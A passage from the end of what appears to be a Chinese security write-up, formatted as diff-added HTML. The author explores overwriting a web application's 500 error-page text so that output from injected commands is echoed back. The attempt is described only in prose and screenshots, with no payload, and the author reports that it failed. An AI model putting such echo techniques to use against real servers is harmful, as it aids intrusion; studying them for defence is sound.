+<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="mi">500</span> <span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">The</span> <span class="n">server</span> <span class="n">encountered</span> <span class="n">an</span> <span class="n">internal</span> <span class="n">error</span> <span class="n">and</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">your</span> <span class="n">request</span><span class="o">.</span> <span class="n">Either</span> <span class="n">the</span> <span class="n">server</span> <span class="n">is</span> <span class="n">overloaded</span> <span class="n">or</span> <span class="n">there</span> <span class="n">is</span> <span class="n">an</span> <span class="n">error</span> <span class="n">in</span> <span class="n">the</span> <span class="n">application</span><span class="o">.&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</pre></div>
+<p>如果我们找到这些字符，把他们替换为我们的命令回显能成功吗</p>
+<p>首先寻找一些字符</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180748-2705435c-9382-1.png"/></p>
+<p>找到了 response 对象，这里有各种状态码的报错，寻找 500</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180751-291ad210-9382-1.png"/></p>
+<p>然后在页面选择</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180756-2bea1f1e-9382-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180759-2deb4414-9382-1.png"/></p>
+<p>然后修改，但是出现了一个问题，setattr 怎么修改??<br/>
+然后尝试了其他方法都是失败了</p>
+<h2 data-content="1" id="51571f191bd1ddc8b1be5b0981282fde">最后</h2>
+<p>其实如果能够找到 response，还有很多去其他的属性可以修改，但是时间精力有限，也没有再去找了</p>
+</div>
+</div>
